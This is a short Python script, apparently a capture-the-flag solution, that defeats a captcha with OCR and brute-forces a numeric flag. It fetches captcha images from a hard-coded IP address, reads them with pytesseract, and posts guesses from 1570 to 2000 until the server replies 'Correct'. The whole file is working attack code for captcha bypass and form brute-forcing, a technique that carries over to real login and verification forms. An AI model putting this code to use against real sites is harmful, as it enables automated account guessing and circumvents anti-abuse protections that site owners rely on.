from PIL import Image
from io import BytesIO
import pytesseract
import requests

s = requests.Session()

for flag_value in range(1570, 2001):

    # Get Captcha image
    get_captcha_image = s.get("http://31.220.95.27:9002/captcha.php")

    extract_captcha = Image.open(BytesIO(get_captcha_image.content))

    captcha_extracted_text = pytesseract.image_to_string(extract_captcha)
    print(captcha_extracted_text)
    box = []
    payload = {
        "flag": flag_value,
        "captcha": captcha_extracted_text,
        "submit": "Envoyer",
    }
    r = s.post("http://31.220.95.27:9002/captcha1/", data=payload)
    print(f"Trying flag value: {flag_value}")

    if "Correct" in r.text:
        print(f"Correct flag found: {flag_value}")
        break
